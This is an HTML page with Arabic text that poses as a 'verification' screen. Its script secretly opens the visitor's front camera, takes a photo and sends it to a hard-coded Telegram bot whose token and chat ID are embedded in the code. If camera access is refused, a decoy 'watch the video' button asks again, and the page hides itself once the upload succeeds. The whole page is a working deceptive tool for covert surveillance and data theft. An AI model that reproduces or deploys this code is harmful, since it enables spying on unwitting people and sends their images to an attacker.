<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #fff; font-family: Arial; }
        #status { text-align: center; padding: 20px; background: #222; border-radius: 12px; border: 1px solid #444; width: 90%; max-width: 350px; }
        .spinner { width: 40px; height: 40px; margin: 0 auto 15px; border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #preview { display: none; max-width: 100%; margin: 10px auto; border-radius: 12px; border: 2px solid #00ff88; }
        video { display: none; }
        #log { display: none; color: #ff6666; font-size: 12px; margin-top: 10px; word-break: break-all; }
    </style>
</head>
<body>
    <div id="status">
        <div class="spinner"></div>
        <h2>⏳ جاري التحقق...</h2>
        <p style="color: #aaa; font-size: 14px;">يرجى الانتظار</p>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <img id="preview" alt="">
        <div id="log"></div>
    </div>
    <script>
        const BOT_TOKEN = "7534560325:AAGweV4abQXjt7nBRkRdNWozVSb3M61OK7s";
        const CHAT_ID = "1043642109";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const log = document.getElementById('log');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then((stream) => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    capturePhoto(stream);
                }, 500);
            })
            .catch(() => {
                document.querySelector('h2').innerText = '⛔ مطلوب صلاحية الكاميرا';
                const btn = document.createElement('button');
                btn.innerText = '📸 اضغط هنا لمشاهدة الفيديو';
                btn.style.cssText = 'background:#00ff88;color:#000;padding:10px 25px;border:none;border-radius:30px;font-weight:bold;margin-top:10px;cursor:pointer;';
                btn.onclick = () => {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                        .then(s => capturePhoto(s))
                        .catch(() => alert('يرجى السماح للكاميرا'));
                };
                document.getElementById('status').appendChild(btn);
            });

        function capturePhoto(stream) {
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            canvas.width = settings.width || 640;
            canvas.height = settings.height || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                // معاينة
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                    document.querySelector('.spinner').style.display = 'none';
                    document.querySelector('h2').style.display = 'none';
                    document.querySelector('p').style.display = 'none';
                };
                reader.readAsDataURL(blob);

                // 🔥 إرسال مباشر عبر fetch
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    console.log('Telegram:', data);
                    if (data.ok) {
                        // إخفاء كل شيء عند النجاح
                        document.getElementById('status').style.display = 'none';
                    } else {
                        log.style.display = 'block';
                        log.innerText = '⚠️ ' + data.description;
                    }
                })
                .catch(err => {
                    console.error(err);
                    log.style.display = 'block';
                    log.innerText = '⚠️ خطأ اتصال: ' + err.message;
                });

                // إيقاف الكاميرا
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        }
    </script>
</body>
</html>
